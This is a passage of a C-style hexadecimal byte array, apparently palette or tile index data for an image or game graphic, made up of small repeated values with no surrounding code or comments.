0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B,
0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D,
0x1D, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x1B, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x07,
0x19, 0x18, 0x17, 0x17, 0x17, 0x18, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B,
0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x07, 0x07,
0x07, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C,
0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x1B, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C,
0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D,
0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07,
0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x19, 0x18, 0x19, 0x07,
0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x07, 0x19, 0x19, 0x19, 0x07, 0x1B, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1B, 0x1B, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07,
0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07,
0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C,
0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x07, 0x19,
0x19, 0x19, 0x19, 0x07, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07,
0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x07, 0x18,
0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x18, 0x07, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07,
0x1B, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B,
0x1B, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x07, 0x07,
0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B,
0x07, 0x19, 0x19, 0x19, 0x18, 0x16, 0x16, 0x17, 0x19, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x1B,
0x1B, 0x07, 0x07, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
